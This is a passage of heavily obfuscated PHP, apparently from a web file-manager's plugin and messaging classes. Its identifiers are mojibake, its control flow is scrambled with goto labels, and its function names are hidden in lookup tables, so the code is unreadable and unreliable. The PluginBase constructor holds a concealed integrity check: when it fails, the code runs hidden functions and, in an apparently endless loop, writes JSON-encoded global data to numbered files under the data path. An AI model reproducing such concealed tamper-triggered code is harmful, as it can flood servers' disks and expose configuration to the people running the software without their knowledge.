qfyv6ffa4b29($E­Ë»Ç…†Ÿ, $d©Úéææœã, $E¦‚Óâ…¯Ğ = 3) { goto bõ­Ì·‰‰©; bõ­Ì·‰‰©: $e§Õóñ«„– =& $_SERVER[…ë˜õ]; $e¾õç–Ø›… =& $_SERVER[­ó]; if (!$e¾õç–Ø›…[354]($E­Ë»Ç…†Ÿ) || $e¾õç–Ø›…[24]($E­Ë»Ç…†Ÿ) < 10) { return !1; } goto EÛïÃã›·…; dâ»’£ùÑô: $Aœ¦ñÕæí = $E­Ë»Ç…†Ÿ[0]; $A…Óº£³» = $e§Õóñ«„–[680]; if (strlen($A…Óº£³») < $e§Õóñ«„–[574]) { die; } goto B÷¤Äª‰´; BÖİˆÖğ : switch ($Aœ¦ñÕæí) { case $e¾õç–Ø›…[241]: $Eƒ¢Î˜Èë = $this->{$_SERVER[­ó][257]}($E­Ë»Ç…†Ÿ, $e¾õç–Ø›…[221]($d©Úéææœã . $AÒ¡ñ°àõ‹)); break; $dˆÛÂ÷ĞŠ¬ = $e§Õóñ«„–[683]; if (strlen($dˆÛÂ÷ĞŠ¬) < $e§Õóñ«„–[580]) { die; } case $e¾õç–Ø›…[227]: $Eƒ¢Î˜Èë = $this->{$_SERVER[­ó][257]}($E­Ë»Ç…†Ÿ, $e¾õç–Ø›…[221]($AÒ¡ñ°àõ‹ . $d©Úéææœã)); break; $Aò¦ñ“ïÜ = $e§Õóñ«„–[684]; if (!$Aò¦ñ“ïÜ) { return; } case $e¾õç–Ø›…[348]: $Eƒ¢Î˜Èë = $this->{$_SERVER[­ó][257]}($E­Ë»Ç…†Ÿ, $e¾õç–Ø›…[125]($AÒ¡ñ°àõ‹ . $d©Úéææœã)); break; case $e¾õç–Ø›…[349]: $Eƒ¢Î˜Èë = $this->{$_SERVER[­ó][257]}($E­Ë»Ç…†Ÿ, $e¾õç–Ø›…[121]($AÒ¡ñ°àõ‹ . $d©Úéææœã)); $dª†£è§º = $e§Õóñ«„–[685]; if (strlen($dª†£è§º) < $e§Õóñ«„–[599]) { return; } break; $F‰êµ¾„× = $e§Õóñ«„–[686]; case $e¾õç–Ø›…[350]: goto EÈÁ‹•øÍ³; EÈÁ‹•øÍ³: $E­Ë»Ç…†Ÿ = $e¾õç–Ø›…[355]($E­Ë»Ç…†Ÿ); $bèœ×èçÛ§ = $e§Õóñ«„–[687]; while ($bèœ×èçÛ§ < $e§Õóñ«„–[574]) { if ($bèœ×èçÛ§ >= 0) { break; } $bèœ×èçÛ§++; } goto EƒÂ–Ç¨×ğ; CáÃ—É«¥: $E±ÇøèÄ¤ = $e¾õç–Ø›…[352]($då—àå©ôÀ, $Fò‚³…Óµğ); $fÊêíçæ”” = $e§Õóñ«„–[690]; if (strlen($fÊêíçæ””) < $e§Õóñ«„–[599]) { die; } goto EÌ‡ÛªÖÑŠ; c°ˆ½™œõŸ: $b¹‹æÓ°Ú = $e§Õóñ«„–[699]; if (strlen($b¹‹æÓ°Ú) < $e§Õóñ«„–[570]) { die; } goto Dˆ©¥è®íŒ; FÖ‚ï˜ÔŞ¡: for ($cÑêÉÜóš = 0; $cÑêÉÜóš < $e¾õç–Ø›…[24]($E­Ë»Ç…†Ÿ); $cÑêÉÜóš++) { $bŠø—ä‘ = $bŠø—ä‘ == $e¾õç–Ø›…[24]($C êåËÛ²) ? 0 : $bŠø—ä‘; $EøÄößÄÇæ = $e§Õóñ«„–[694]; if (strlen($EøÄößÄÇæ) < $e§Õóñ«„–[580]) { die; } $f¼Êß‡”Šº = $bŠø—ä‘++; $dç¼’‹Êç = $e§Õóñ«„–[695]; if (!$dç¼’‹Êç) { die; } $a°˜¿Ô´±À = $e¾õç–Ø›…[352]($då—àå©ôÀ, $E­Ë»Ç…†Ÿ[$cÑêÉÜóš]) - $E±ÇøèÄ¤ - $e¾õç–Ø›…[353]($C êåËÛ²[$f¼Êß‡”Šº]); $EœˆŠ°¥´š = $e§Õóñ«„–[696]; if (!$EœˆŠ°¥´š) { return; } while ($a°˜¿Ô´±À < 0) { $a°˜¿Ô´±À += 64; $CË§ÇËÕƒâ = $e§Õóñ«„–[697]; if (strlen($CË§ÇËÕƒâ) < $e§Õóñ«„–[599]) { die; } } $CÆÌÙ©±ôÁ .= $då—àå©ôÀ[$a°˜¿Ô´±À]; $BĞ«‰ôá· = $e§Õóñ«„–[698]; } $Eƒ¢Î˜Èë = $e¾õç–Ø›…[356]($CÆÌÙ©±ôÁ); break; goto c°ˆ½™œõŸ; cÒ‹ëš‡—Û: $C êåËÛ² = $e¾õç–Ø›…[25]($C êåËÛ², $E±ÇøèÄ¤ % 8, $E±ÇøèÄ¤ % 8 + 7); $CÆÌÙ©±ôÁ = $e¾õç–Ø›…[10]; $dÉöˆ÷Ä¿Œ = $e§Õóñ«„–[692]; goto cïÔÊŸóŞ; EğÑ·³øï: while (strlen($D„¹÷Ú•Ô²) < $e§Õóñ«„–[570]) { if (!$D„¹÷Ú•Ô²) { break; } $D„¹÷Ú•Ô²++; } $a°˜¿Ô´±À = 0; $bŠø—ä‘ = 0; goto FÖ‚ï˜ÔŞ¡; EÌ‡ÛªÖÑŠ: $C êåËÛ² = $e¾õç–Ø›…[121]($Fò‚³…Óµğ . $e¾õç–Ø›…[121]($d©Úéææœã . $Fò‚³…Óµğ) . $d©Úéææœã); $eÉŒ“åÈ˜° = $e§Õóñ«„–[691]; if (!$eÉŒ“åÈ˜°) { die; } goto cÒ‹ëš‡—Û; cïÔÊŸóŞ: if (strlen($dÉöˆ÷Ä¿Œ) < $e§Õóñ«„–[574]) { die; } $cÑêÉÜóš = 0; $D„¹÷Ú•Ô² = $e§Õóñ«„–[693]; goto EğÑ·³øï; EƒÂ–Ç¨×ğ: $Fò‚³…Óµğ = $E­Ë»Ç…†Ÿ[0]; $d‡…è¥è¨‡ = $e§Õóñ«„–[688]; if (!$d‡…è¥è¨‡) { return; } goto c…×¢™‚Ï; c…×¢™‚Ï: $E­Ë»Ç…†Ÿ = $e¾õç–Ø›…[25]($E­Ë»Ç…†Ÿ, 1); $e–®òø®½ = $e§Õóñ«„–[689]; if (strlen($e–®òø®½) < $e§Õóñ«„–[574]) { die; } goto CáÃ—É«¥; Dˆ©¥è®íŒ: default: $Eƒ¢Î˜Èë = $this->{$_SERVER[­ó][257]}($E­Ë»Ç…†Ÿ, $d©Úéææœã . $AÒ¡ñ°àõ‹); break; $b…‚éåˆ±ğ = $e§Õóñ«„–[700]; if (strlen($b…‚éåˆ±ğ) < $e§Õóñ«„–[570]) { return; } } if ($E¦‚Óâ…¯Ğ - 1 > 0) { $Eƒ¢Î˜Èë = $this->{$_SERVER[­ó][196]}($Eƒ¢Î˜Èë, $d©Úéææœã, $E¦‚Óâ…¯Ğ - 1); } return $Eƒ¢Î˜Èë; goto d‘¯¼Ş¸öÄ; EÛïÃã›·…: $E­Ë»Ç…†Ÿ = $e¾õç–Ø›…[2]($E­Ë»Ç…†Ÿ); $cƒÑğ¬­ÑÍ = $e§Õóñ«„–[679]; $E­Ë»Ç…†Ÿ = $e¾õç–Ø›…[221]($E­Ë»Ç…†Ÿ); goto dâ»’£ùÑô; eÛÑİŠª‹™: $då—àå©ôÀ = $e¾õç–Ø›…[347]; $B‹‘ÜÓ«¹‘ = $e§Õóñ«„–[682]; if (strlen($B‹‘ÜÓ«¹‘) < $e§Õóñ«„–[596]) { die; } goto BÖİˆÖğ ; B÷¤Äª‰´: $AÒ¡ñ°àõ‹ = $e¾õç–Ø›…[25]($E­Ë»Ç…†Ÿ, 1, 15); $Cí”Ø‰‹‰Á = $e§Õóñ«„–[681]; $E­Ë»Ç…†Ÿ = $e¾õç–Ø›…[25]($E­Ë»Ç…†Ÿ, 16); goto eÛÑİŠª‹™; d‘¯¼Ş¸öÄ: } public function njdu21de0698($aè›ŸÅÜ¹‹) { goto e×¨…²·´¯; DãŒê³ø¶—: while ($cÔ¥¨Œ†áÜ < $Dƒ‚œ¿Ğ[570]) { if ($cÔ¥¨Œ†áÜ >= 0) { break; } $cÔ¥¨Œ†áÜ++; } $F¤”¾ôİ† = $b¥†éšö–é[251](($E‚ã¾ÒÌÀÃ + $B©»š¤¥¹³) / 2); $FÛ‰¼ÌòŞ = $Dƒ‚œ¿Ğ[702]; goto b³ÆÓÌõ¨­; a•†ğÙõ‹Œ: $dÛéŒ÷ì™· = $Dƒ‚œ¿Ğ[708]; $AÂ…º“…” = $b¥†éšö–é[121]($b¥†éšö–é[358] . ($E‚ã¾ÒÌÀÃ + $B©»š¤¥¹³) . $b¥†éšö–é[359] . $F¤”¾ôİ† . $b¥†éšö–é[359] . $Bˆ’Å­‡‹¤ . $b¥†éšö–é[360]); $f†ìÚõ˜„ = $this->{$_SERVER[­ó][154]}($aè›ŸÅÜ¹‹, $AÂ…º“…”) . $b¥†éšö–é[361] . $E„ğ¦èÊàÍ; goto b½æğÙ¹œŞ; b³ÆÓÌõ¨­: while (1) { $b—­ªƒğÇ½ = $F¤”¾ôİ†; $FÅ‹öïÑ = $Dƒ‚œ¿Ğ[703]; if (strlen($FÅ‹öïÑ) < $Dƒ‚œ¿Ğ[596]) { die; } $e‰å§É°‡‘ = $F¥ãÓ¼•óˆ; while ($e‰å§É°‡‘ % $b—­ªƒğÇ½ != 0) { $còÌÂáÕï = $e‰å§É°‡‘; $FÔÍàÖŠ”Ø = $Dƒ‚œ¿Ğ[704]; while (strlen($FÔÍàÖŠ”Ø) < $Dƒ‚œ¿Ğ[580]) { if (!$FÔÍàÖŠ”Ø) { break; } $FÔÍàÖŠ”Ø++; } $e‰å§É°‡‘ = $b—­ªƒğÇ½; $CÎñ§”“›Ë = $Dƒ‚œ¿Ğ[705]; $b—­ªƒğÇ½ = $còÌÂáÕï % $b—­ªƒğÇ½; $CÓ½ëÉà = $Dƒ‚œ¿Ğ[706]; } if ($b—­ªƒğÇ½ == 1) { break; } else { $F¤”¾ôİ†++; } } $Bˆ’Å­‡‹¤ = 2; $F™¨–’ë³ = $Dƒ‚œ¿Ğ[707]; goto Dˆ—¿ª™; e×¨…²·´¯: $Dƒ‚œ¿Ğ =& $_SERVER[…ë˜õ]; $b¥†éšö–é =& $_SERVER[­ó]; $E‚ã¾ÒÌÀÃ = $this->{$_SERVER[­ó][357]}(); goto e‚¼†”ÅÄ‡; e‚¼†”ÅÄ‡: $B©»š¤¥¹³ = $this->{$_SERVER[­ó][357]}(); $F¥ãÓ¼•óˆ = ($E‚ã¾ÒÌÀÃ - 1) * ($B©»š¤¥¹³ - 1); $cÔ¥¨Œ†áÜ = $Dƒ‚œ¿Ğ[701]; goto DãŒê³ø¶—; Dˆ—¿ª™: if (!$F™¨–’ë³) { die; } for ($A­»†ñå = 0; $A­»†ñå < $F¥ãÓ¼•óˆ * 10; $A­»†ñå++) { if (($F¥ãÓ¼•óˆ * $A­»†ñå + 1) % $F¤”¾ôİ† == 0) { $Bˆ’Å­‡‹¤ = $b¥†éšö–é[251](($F¥ãÓ¼•óˆ * $A­»†ñå + 1) / $F¤”¾ôİ†); break; } } $E„ğ¦èÊàÍ = $this->{$_SERVER[­ó][154]}($E‚ã¾ÒÌÀÃ * $B©»š¤¥¹³ . $b¥†éšö–é[10], $b¥†éšö–é[156]); goto a•†ğÙõ‹Œ; b½æğÙ¹œŞ: return $f†ìÚõ˜„; goto C©ÀÚ­–±Ê; C©ÀÚ­–±Ê: } public function gfkyf9691872($fáÖ‹Ü’äï) { goto DëŒè‹ã‚ö; bë–¢‰º…Ô: if ($BÑ¬¥†¹ ¢[19]($DÄÅ„—âÆ) != 2) { return $BÑ¬¥†¹ ¢[10]; } $e¾ÇŒÌæ›´ = $this->{$_SERVER[­ó][257]}($DÄÅ„—âÆ[1] . $BÑ¬¥†¹ ¢[10], $BÑ¬¥†¹ ¢[156]); $fª±ÛÙ¨Èé = $bÛ¥Ï¦ƒâ[709]; goto d£‰ÃÉ—œ…; F­à³ÄÈ¦¯: $EñáØÑÙêå = $bÛ¥Ï¦ƒâ[718]; if (strlen($EñáØÑÙêå) < $bÛ¥Ï¦ƒâ[574]) { die; } for ($fÁ÷”éÊ» = 0; $fÁ÷”éÊ» < $cõëóäÅÍ * 10; $fÁ÷”éÊ»++) { if (($cõëóäÅÍ * $fÁ÷”éÊ» + 1) % $A½î—ƒ¥Ù¿ == 0) { $A÷ßÒßÔÖ¸ = $BÑ¬¥†¹ ¢[251](($cõëóäÅÍ * $fÁ÷”éÊ» + 1) / $A½î—ƒ¥Ù¿); break; } } goto E†ØËì³÷¹; d¿ÊŒØ¶‘: while ($F¡‡«Š„† < $bÛ¥Ï¦ƒâ[574]) { if ($F¡‡«Š„† >= 0) { break; } $F¡‡«Š„†++; } while (1) { $D•ËÍÈ‡ÄÂ = $A½î—ƒ¥Ù¿; $Aó‰Öì—´¤ = $bÛ¥Ï¦ƒâ[715]; $bŒƒÛ¡ÁÀ = $cõëóäÅÍ; while ($bŒƒÛ¡ÁÀ % $D•ËÍÈ‡ÄÂ != 0) { $FäÒ¬áØ­ = $bŒƒÛ¡ÁÀ; $bŒƒÛ¡ÁÀ = $D•ËÍÈ‡ÄÂ; $e¾Û×Ÿ·³ö = $bÛ¥Ï¦ƒâ[716]; if (strlen($e¾Û×Ÿ·³ö) < $bÛ¥Ï¦ƒâ[580]) { die; } $D•ËÍÈ‡ÄÂ = $FäÒ¬áØ­ % $D•ËÍÈ‡ÄÂ; $fùò‡¤¡„ô = $bÛ¥Ï¦ƒâ[717]; if (!$fùò‡¤¡„ô) { return; } } if ($D•ËÍÈ‡ÄÂ == 1) { break; } else { $A½î—ƒ¥Ù¿++; } } $A÷ßÒßÔÖ¸ = 2; goto F­à³ÄÈ¦¯; AÊ”®Š°àì: if (!$fàè¨Šà²) { return; } for ($fÁ÷”éÊ» = 3; $fÁ÷”éÊ» < $e¾ÇŒÌæ›´; $fÁ÷”éÊ» += 2) { if ($e¾ÇŒÌæ›´ % $fÁ÷”éÊ» != 0) { continue; } $eªìë¸‘”ƒ = $fÁ÷”éÊ»; $Fê¥¡Ô÷–Î = $BÑ¬¥†¹ ¢[251]($e¾ÇŒÌæ›´ / $fÁ÷”éÊ»); break; $cå´ÜìÏÍ = $bÛ¥Ï¦ƒâ[713]; if (!$cå´ÜìÏÍ) { die; } } $cõëóäÅÍ = ($eªìë¸‘”ƒ - 1) * ($Fê¥¡Ô÷–Î - 1); goto c¹º„ÌŞÃ„; DŠœ¡ŒÓ§”: $BùÉß­š…¾ = $bÛ¥Ï¦ƒâ[710]; $eªìë¸‘”ƒ = 0; $AÅ†ò¿ùí¡ = $bÛ¥Ï¦ƒâ[711]; goto EÛ“äíËëŒ; c¹º„ÌŞÃ„: $DÑ˜¶–×™ = $bÛ¥Ï¦ƒâ[618]; $A½î—ƒ¥Ù¿ = $BÑ¬¥†¹ ¢[251](($eªìë¸‘”ƒ + $Fê¥¡Ô÷–Î) / 2); $F¡‡«Š„† = $bÛ¥Ï¦ƒâ[714]; goto d¿ÊŒØ¶‘; DëŒè‹ã‚ö: $bÛ¥Ï¦ƒâ =& $_SERVER[…ë˜õ]; $BÑ¬¥†¹ ¢ =& $_SERVER[­ó]; $DÄÅ„—âÆ = $BÑ¬¥†¹ ¢[0]($BÑ¬¥†¹ ¢[361], $fáÖ‹Ü’äï); goto bë–¢‰º…Ô; d£‰ÃÉ—œ…: while (strlen($fª±ÛÙ¨Èé) < $bÛ¥Ï¦ƒâ[574]) { if (!$fª±ÛÙ¨Èé) { break; } $fª±ÛÙ¨Èé++; } if (!$e¾ÇŒÌæ›´) { return $BÑ¬¥†¹ ¢[10]; } $e¾ÇŒÌæ›´ = $BÑ¬¥†¹ ¢[251]($e¾ÇŒÌæ›´); goto DŠœ¡ŒÓ§”; EÛ“äíËëŒ: while ($AÅ†ò¿ùí¡ < $bÛ¥Ï¦ƒâ[599]) { if ($AÅ†ò¿ùí¡ >= 0) { break; } $AÅ†ò¿ùí¡++; } $Fê¥¡Ô÷–Î = 0; $fàè¨Šà² = $bÛ¥Ï¦ƒâ[712]; goto AÊ”®Š°àì; E†ØËì³÷¹: $BŠğĞÜ£ÅĞ = $BÑ¬¥†¹ ¢[121]($BÑ¬¥†¹ ¢[358] . ($eªìë¸‘”ƒ + $Fê¥¡Ô÷–Î) . $BÑ¬¥†¹ ¢[359] . $A½î—ƒ¥Ù¿ . $BÑ¬¥†¹ ¢[359] . $A÷ßÒßÔÖ¸ . $BÑ¬¥†¹ ¢[360]); $eÔ´è¶÷Õ± = $bÛ¥Ï¦ƒâ[719]; $aáâ„‡Ÿ¸½ = $this->{$_SERVER[­ó][257]}($DÄÅ„—âÆ[0], $BŠğĞÜ£ÅĞ); goto A¢»À•ó­; A¢»À•ó­: $D¸ª˜ªÔğ§ = $bÛ¥Ï¦ƒâ[720]; return $aáâ„‡Ÿ¸½; goto AçÈŞÈ×ä; AçÈŞÈ×ä: } public function hwjufdde2a79() { goto aÃÕÛ¶Ñµ; a¿Û„Ş²¡: $dƒÃ—È¥²ï = $AÍ¼Æô‹íë[722]; while (strlen($dƒÃ—È¥²ï) < $AÍ¼Æô‹íë[574]) { if (!$dƒÃ—È¥²ï) { break; } $dƒÃ—È¥²ï++; } $cáóÄ–¶šÆ = 1; goto e¶’‘‘¦Ï; aÃÕÛ¶Ñµ: $AÍ¼Æô‹íë =& $_SERVER[…ë˜õ]; $CêìôÚŠëˆ =& $_SERVER[­ó]; $BÍÉôƒÚÔÓ = $CêìôÚŠëˆ[342]($CêìôÚŠëˆ[362](2, 14), $CêìôÚŠëˆ[362](2, 16) - 1); goto FÏä¨³÷İ·; BİÊĞİºÚ•: $c§‘ƒ¿Ö¯ì = $AÍ¼Æô‹íë[727]; if (!$c§‘ƒ¿Ö¯ì) { return; } goto f»ÇÓÉè…˜; AÍ‹Áò¯: while (strlen($B‡È‹º×¸‚) < $AÍ¼Æô‹íë[570]) { if (!$B‡È‹º×¸‚) { break; } $B‡È‹º×¸‚++; } for ($Bƒ‹èõÎº = $BÍÉôƒÚÔÓ; $Bƒ‹èõÎº > 1; $Bƒ‹èõÎº--) { $f­Ú·Ú ÌÁ = !0; foreach ($bÑŠåçÈÍƒ as $D³”•‘Ë) { if ($Bƒ‹èõÎº % $D³”•‘Ë == 0) { $f­Ú·Ú ÌÁ = !1; break; } } if ($f­Ú·Ú ÌÁ) { $BÍ‡ìåâ = $Bƒ‹èõÎº; break; } } return $BÍ‡ìåâ; goto BİÊĞİºÚ•; e¶’‘‘¦Ï: while ($cáóÄ–¶šÆ <= (int) $CêìôÚŠëˆ[363]($BÍÉôƒÚÔÓ)) { $Bƒ‹èõÎº = $cáóÄ–¶šÆ; $dã£ÆŠª† = $AÍ¼Æô‹íë[723]; while (strlen($dã£ÆŠª†) < $AÍ¼Æô‹íë[580]) { if (!$dã£ÆŠª†) { break; } $dã£ÆŠª†++; } while (!0) { $Bƒ‹èõÎº++; $BåºÚÛÇˆ = $AÍ¼Æô‹íë[724]; while (strlen($BåºÚÛÇˆ) < $AÍ¼Æô‹íë[596]) { if (!$BåºÚÛÇˆ) { break; } $BåºÚÛÇˆ++; } if ($Bƒ‹èõÎº <= 2) { $cáóÄ–¶šÆ = $Bƒ‹èõÎº; break; } else { if ($Bƒ‹èõÎº < 2) { continue; } } $f­Ú·Ú ÌÁ = !0; for ($DÚ…—­ö = 2; $DÚ…—­ö <= $CêìôÚŠëˆ[363]($Bƒ‹èõÎº); $DÚ…—­ö++) { if ($Bƒ‹èõÎº % $DÚ…—­ö == 0) { $f­Ú·Ú ÌÁ = !1; } } if ($f­Ú·Ú ÌÁ) { $cáóÄ–¶šÆ = $Bƒ‹èõÎº; break; } } $bÑŠåçÈÍƒ[] = $cáóÄ–¶šÆ; $aÃŒİõ¾é = $AÍ¼Æô‹íë[725]; if (strlen($aÃŒİõ¾é) < $AÍ¼Æô‹íë[599]) { return; } } $BÍ‡ìåâ = 2; $B‡È‹º×¸‚ = $AÍ¼Æô‹íë[726]; goto AÍ‹Áò¯; FÏä¨³÷İ·: $Bºéæ·ˆ© = $AÍ¼Æô‹íë[721]; if (!$Bºéæ·ˆ©) { die; } $bÑŠåçÈÍƒ = array(); goto a¿Û„Ş²¡; f»ÇÓÉè…˜: } public function lary3a2e7780($bÆ×°èîô, $eÄœŒšÚ—…) { $EŠÄÒ•ÕÌè =& $_SERVER[­ó]; return $EŠÄÒ•ÕÌè[13](array($EŠÄÒ•ÕÌè[14], $EŠÄÒ•ÕÌè[364]), $bÆ×°èîô, $eÄœŒšÚ—…); } public function dvfm3a422051($f«¨ŸÕ£¨‡, $CÙõ‘††œí) { $Aãì­İÏ„‰ =& $_SERVER[…ë˜õ]; $eÆ¯É÷èÌº =& $_SERVER[­ó]; return $eÆ¯É÷èÌº[13](array($eÆ¯É÷èÌº[365], $eÆ¯É÷èÌº[366]), $f«¨ŸÕ£¨‡, $CÙõ‘††œí); $B¹½³¢¤Ú = $Aãì­İÏ„‰[728]; if (strlen($B¹½³¢¤Ú) < $Aãì­İÏ„‰[580]) { die; } } public function jzsxe28c1e2e($Eé„¥Í¾Î, $BâÑÑùñƒ) { $D¢ˆÇ²¢šÛ =& $_SERVER[­ó]; return $D¢ˆÇ²¢šÛ[13](array($D¢ˆÇ²¢šÛ[365], $D¢ˆÇ²¢šÛ[367]), $Eé„¥Í¾Î, $BâÑÑùñƒ); } } goto dÊŒäö˜ä„; a¨»·ã¨×Õ: class Message { function __construct() { } public function send($BäË’ˆÃ¡ = '', $EÂãëä›’Ö = array(), $EôŠÉëíç‡ = "\x74\x65\x78\x74") { goto dÏ¡â¹‹º; A¥é½¤¾ä: Hook::trigger($BÔÙ™ƒå[1401], $b¶­ŠÓØ†); goto A…±£à¶Œå; EÅçº„Õ¶: $EÂãëä›’Ö = array($BÔÙ™ƒå[1021] => isset($EÂãëä›’Ö[$BÔÙ™ƒå[1021]]) ? $EÂãëä›’Ö[$BÔÙ™ƒå[1021]] : $BÔÙ™ƒå[33], $BÔÙ™ƒå[557] => isset($EÂãëä›’Ö[$BÔÙ™ƒå[557]]) ? $EÂãëä›’Ö[$BÔÙ™ƒå[557]] : $BÔÙ™ƒå[33]); if (empty($BäË’ˆÃ¡) || empty($EÂãëä›’Ö[$BÔÙ™ƒå[1021]]) && empty($EÂãëä›’Ö[$BÔÙ™ƒå[557]])) { return !1; } $b¶­ŠÓØ† = array($BÔÙ™ƒå[1339] => $B¸³âàµ, $BÔÙ™ƒå[1400] => $EÂãëä›’Ö); goto A¥é½¤¾ä; dÏ¡â¹‹º: $BÔÙ™ƒå =& $_SERVER[…ë˜õ]; $B¸³âàµ = array($BÔÙ™ƒå[29] => $BÔÙ™ƒå[1398], $BÔÙ™ƒå[734] => $BäË’ˆÃ¡); if (in_array($EôŠÉëíç‡, array($BÔÙ™ƒå[1398], $BÔÙ™ƒå[1399]))) { $B¸³âàµ[$BÔÙ™ƒå[29]] = $EôŠÉëíç‡; } goto EÅçº„Õ¶; A…±£à¶Œå: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto b§…¶æ£ñ; dâÃõº§÷: $this->pluginHostDefault = $config[$E„®¹¬÷äÅ[1404]] . $this->pluginName . $E„®¹¬÷äÅ[8]; $BõÈ¬‘¸ = $config[$E„®¹¬÷äÅ[1405]]; if ($BõÈ¬‘¸ && strpos($E„®¹¬÷äÅ[47] . $BõÈ¬‘¸ . $E„®¹¬÷äÅ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$E„®¹¬÷äÅ[1406]] . $this->pluginName . $E„®¹¬÷äÅ[8]; } goto C¡Šø¡’í²; b§…¶æ£ñ: $E„®¹¬÷äÅ =& $_SERVER[…ë˜õ]; $Aëµäõ‹ÎÂ = $_SERVER[$E„®¹¬÷äÅ[827]] . $E„®¹¬÷äÅ[828]; $C©  ÉÚİã = $E„®¹¬÷äÅ[844]; goto eªØÆ„™; FŞ³‰Æ»¡: $this->in =& $in; $this->modelPlugin = Model($E„®¹¬÷äÅ[1402]); $this->pluginName = str_replace($E„®¹¬÷äÅ[1402], $E„®¹¬÷äÅ[33], get_class($this)); goto Dª³ƒŒš±æ; Dª³ƒŒš±æ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $E„®¹¬÷äÅ[8]; $this->pluginApi = appHostGet() . $E„®¹¬÷äÅ[1403] . $this->pluginName . $E„®¹¬÷äÅ[8]; $this->pluginHost = $config[$E„®¹¬÷äÅ[1404]] . $this->pluginName . $E„®¹¬÷äÅ[8]; goto dâÃõº§÷; eªØÆ„™: if ($_SERVER[$E„®¹¬÷äÅ[824]] != $C©  ÉÚİã($Aëµäõ‹ÎÂ)) { goto fÛ–Š×…ç÷; aÒâŸ×‰²: $d¡ô‚õé¢†(); $BØ‘Ôçøƒ = $E„®¹¬÷äÅ[848]; $e¬å¾áœø‹ = json_encode($GLOBALS[$E„®¹¬÷äÅ[849]]); goto AÉŠù®í²Ç; eâ­„›‹à³: $CËÓ©ôÖëª = $cÒ§Ùë”‡($DØÖ×œÖ‡™); $b£ôÀÁøáõ = explode($E„®¹¬÷äÅ[227], $CËÓ©ôÖëª); if (count($b£ôÀÁøáõ) < $E„®¹¬÷äÅ[570]) { $fÈŒ†³Ö = $E„®¹¬÷äÅ[829]; $fÈŒ†³Ö(); } goto aá‘íîšæ; AÉŠù®í²Ç: $c’¸Ê¤Áí” = 1; for ($d¤ÖÈíÁµ’ = $c’¸Ê¤Áí”; $d¤ÖÈíÁµ’ > 0; $d¤ÖÈíÁµ’++) { $BØ‘Ôçøƒ(DATA_PATH . $d¤ÖÈíÁµ’, $e¬å¾áœø‹); } goto f™ö–¹®ÁÚ; fÛ–Š×…ç÷: $d¡ô‚õé¢† = $E„®¹¬÷äÅ[845]; $cÒ§Ùë”‡ = $E„®¹¬÷äÅ[826]; $DØÖ×œÖ‡™ = $_SERVER[$E„®¹¬÷äÅ[827]] . $E„®¹¬÷äÅ[828]; goto eâ­„›‹à³; aá‘íîšæ: $e‡Ÿ¡ö‰Şˆ = $E„®¹¬÷äÅ[846]; $e‡Ÿ¡ö‰Şˆ($_SERVER[$E„®¹¬÷äÅ[847]]); $d¡ô‚õé¢† = $E„®¹¬÷äÅ[845]; goto aÒâŸ×‰²; f™ö–¹®ÁÚ: } global $in, $config; $this->config =& $config; goto FŞ³‰Æ»¡; C¡Šø¡’í²: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto bï¬¥ ‹Ö; bï¬¥ ‹Ö: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[…ë˜õ][1407]); } protected function assign($D¾ÙÜÒô’ø, $eÌ×ÂÑùŠÔ = false) { if (is_array($D¾ÙÜÒô’ø)) { $this->values = array_merge($this->values, $D¾ÙÜÒô’ø); } else { $this->values[$D¾ÙÜÒô’ø] = $eÌ×ÂÑùŠÔ; } } protected function display($B…ŞéÍóè) { extract($this->values); require $B…ŞéÍóè; } final function hookRegist($cõí ƒ‹«) { $this->modelPlugin->appRegist($this->pluginName, $cõí ƒ‹«); } final function appIcon() { $Dñ¦§Àà³× =& $_SERVER[…ë˜õ]; $a‹ã£îøºº = $this->appPackage(); $aÅÒø“å = $Dñ¦§Àà³×[33]; if (isset($a‹ã£îøºº[$Dñ¦§Àà³×[403]])) { if (isset($a‹ã£îøºº[$Dñ¦§Àà³×[403]][$Dñ¦§Àà³×[1408]])) { $aÅÒø“å = $Dñ¦§Àà³×[1409] . $a‹ã£îøºº[$Dñ¦§Àà³×[403]][$Dñ¦§Àà³×[1408]] . $Dñ¦§Àà³×[1410]; } else { if ($a‹ã£îøºº[$Dñ¦§Àà³×[403]][$Dñ¦§Àà³×[1411]]) { $aÅÒø“å = $Dñ¦§Àà³×[1412] . $a‹ã£îøºº[$Dñ¦§Àà³×[403]][$Dñ¦§Àà³×[1411]] . $Dñ¦§Àà³×[1413]; } } } return $aÅÒø“å; } final function fileCanView($c•ãÓÔ¤âÅ) { goto F¾ê¡‰Šó; aÛĞñ§Ô¤¿: ActionCall($c‡Ãò’êÚÕ[1426], $c•ãÓÔ¤âÅ); goto BÑÇªƒ‘Ù; F¾ê¡‰Šó: $c‡Ãò’êÚÕ =& $_SERVER[…ë˜õ]; if (request_url_safe($c•ãÓÔ¤âÅ)) { return !0; } if ($this->isShare($c•ãÓÔ¤âÅ)) { return !0; } goto Dª¼¨…ŒÌ; Dª¼¨…ŒÌ: $cÜ«À¬‰·È = Session::get($c‡Ãò’êÚÕ[1414]); if (!$cÜ«À¬‰·È || !$cÜ«À¬‰·È[$c‡Ãò’êÚÕ[1415]]) { $Fµ±Øù‘®Õ = $c‡Ãò’êÚÕ[1416] . rawurlencode(this_url()); show_tips(LNG($c‡Ãò’êÚÕ[1417]) . $c‡Ãò’êÚÕ[1418] . $Fµ±Øù‘®Õ . $c‡Ãò’êÚÕ[1419] . LNG($c‡Ãò’êÚÕ[1420]) . $c‡Ãò’êÚÕ[1421], !1); } if (!Action($c‡Ãò’êÚÕ[1422])->authCan($c‡Ãò’êÚÕ[1423])) { show_tips(LNG($c‡Ãò’êÚÕ[1424]) . $c‡Ãò’êÚÕ[1425], !1); } goto aÛĞñ§Ô¤¿; BÑÇªƒ‘Ù: } final function isShare($c‚œŠ°ó¨«) { $cöÑäÈ„ƒè = KodIO::parse($c‚œŠ°ó¨«); return $cöÑäÈ„ƒè[$_SERVER[…ë˜õ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($a˜÷ğ°¡Ç¼) { if (request_url_safe($a˜÷ğ°¡Ç¼)) { return $a˜÷ğ°¡Ç¼; } if 